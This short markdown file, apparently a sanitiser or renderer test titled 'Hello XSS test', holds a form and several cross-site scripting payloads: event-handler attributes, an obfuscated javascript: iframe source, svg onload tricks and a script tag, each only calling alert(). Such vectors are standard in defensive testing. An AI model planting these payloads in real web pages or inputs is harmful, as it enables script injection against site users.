### Hello XSS test

> <form action="/anything" method="POST">
<input name="name"></input>
<button type="submit">Click</button>
</form>

<p onclick="alert('script')">click</p>

<math><mi//xlink:href="data:x,<script>alert(4)</script>">
<p>abc<iframe//src=jAva&Tab;script:alert(3)>def</p>
<svg><g/onload=alert(2)//<p>
<svg><g/onload=alert(2)//<p>
<img src=x onerror=alert(1)//>

> <script>alert(1)</script>